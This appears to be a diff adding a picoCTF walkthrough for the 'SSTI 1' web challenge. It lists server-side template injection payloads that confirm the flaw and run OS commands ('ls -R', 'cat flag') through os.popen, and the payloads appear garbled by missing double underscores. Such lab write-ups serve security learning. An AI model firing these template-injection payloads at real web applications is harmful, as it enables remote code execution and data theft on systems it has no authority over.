@@ -1,0 +1,56 @@
+# 🛡️ PicoCTF Lab Walkthrough – SSTI 1
+
+## 📌 Challenge Info
+- **Category**: Web Exploitation
+- **Points**: Not specified
+- **Difficulty**: Medium
+- **Challenge Link**: N/A
+
+---
+
+## 📝 Challenge Description
+The application was vulnerable to Server-Side Template Injection (SSTI) in an input field.
+
+---
+
+## 🔍 Initial Recon
+- **Files provided**: None
+- **Services/Ports**: Web application
+- **Hints given**: None
+
+---
+
+## 🛠️ Tools & Commands Used
+| Tool / Command | Purpose |
+|----------------|---------|
+| SSTI payloads | Test template injection |
+| OS commands | File access |
+
+---
+
+## 🧠 Step-by-Step Solution
+1. Tested:
+{{7*7}}
+
+Response: `49` → SSTI confirmed.
+2. Directory listing:
+{{request.application.globals.builtins.import('os').popen('ls -R').read()}}
+
+3. Retrieved flag:
+{{request.application.globals.builtins.import('os').popen('cat flag').read()}}
+
+---
+
+## 🧾 Flag
+picoCTF{[actual_flag_here]}
+
+---
+
+## 📚 Learning Outcomes
+- SSTI can lead to full RCE.
+- Sanitizing template input is essential.
+
+---
+
+## 🔗 References
+- [PortSwigger – SSTI](https://portswigger.net/research/server-side-template-injection)
